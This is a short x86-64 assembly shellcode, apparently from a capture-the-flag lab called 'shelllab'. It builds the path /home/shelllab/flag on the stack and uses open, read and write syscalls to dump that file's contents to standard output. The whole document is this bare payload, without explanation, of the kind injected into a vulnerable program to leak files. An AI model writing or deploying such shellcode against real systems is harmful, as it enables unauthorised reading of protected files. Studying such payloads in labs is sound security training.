section.text:
    global _start
_start:
        ; open ;
        mov rax, 0x67616c
        push rax
        mov rax, 0x662f62616c6c6c65
        push rax
        mov rax, 0x68732f656d6f682f; /home/shelllab/flag
        push rax
        mov rdi, rsp
        mov rax, 2
        mov rsi, 0
        mov rdx, 0
        syscall
        ; read ;
        mov rdi, rax
        mov rax, 0
        lea rsi, [rsp+0x30]
        mov rdx, 0x30
        syscall
        ; write ;
        mov rax, 1
        mov rdi, 1
        syscall
